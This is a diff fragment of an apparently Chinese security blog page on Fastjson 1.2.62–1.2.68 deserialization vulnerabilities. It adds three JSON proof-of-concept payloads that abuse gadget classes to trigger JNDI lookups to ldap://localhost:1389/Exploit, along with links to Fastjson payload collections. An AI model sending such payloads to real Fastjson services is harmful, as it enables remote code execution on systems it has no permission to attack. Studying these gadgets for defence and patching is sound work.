+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.caucho.config.types.ResourceRef"</span><span class="token punctuation">,</span><span class="token property">"lookupName"</span><span class="token operator">:</span> <span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span> <span class="token property">"value"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.value"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
+<h3 id="未知版本"><a href="#未知版本" class="headerlink" title="未知版本"></a>未知版本</h3><p>org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：<br><strong>JSON</strong></p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory"</span><span class="token punctuation">,</span> <span class="token property">"tmJndiName"</span><span class="token operator">:</span> <span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span> <span class="token property">"tmFromJndi"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token property">"transactionManager"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.transactionManager"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
+<p>org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：<br><strong>JSON</strong></p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory"</span><span class="token punctuation">,</span> <span class="token property">"tmJndiName"</span><span class="token operator">:</span> <span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span> <span class="token property">"tmFromJndi"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token property">"transactionManager"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.transactionManager"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/232774">浅析Fastjson1.2.62-1.2.68反序列化漏洞-安全客 - 安全资讯平台</a><br><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x02-1-2-62-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x02-1-2-62-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a></p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="各个版本的payload"><a href="#各个版本的payload" class="headerlink" title="各个版本的payload"></a>各个版本的payload</h2><ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md">FastJsonParty/Fastjson全版本检测及利用-Poc.md at main · lemono0/FastJsonParty</a></li>
 <li><a target="_blank" rel="noopener" href="https://github.com/safe6Sec/Fastjson">GitHub - safe6Sec/Fastjson: Fastjson姿势技巧集合</a></li>
 </ul>
@@ -567,16 +663,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/java%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">java安全</span>
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
                                 </a>
                             
-                                <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">反序列化漏洞</span>
-                                </a>
-                            
-                                <a href="/tags/fastjson/">
-                                    <span class="chip bg-color">fastjson</span>
+                                <a href="/tags/springcloud/">
+                                    <span class="chip bg-color">springcloud</span>
                                 </a>
                             
                         </div>
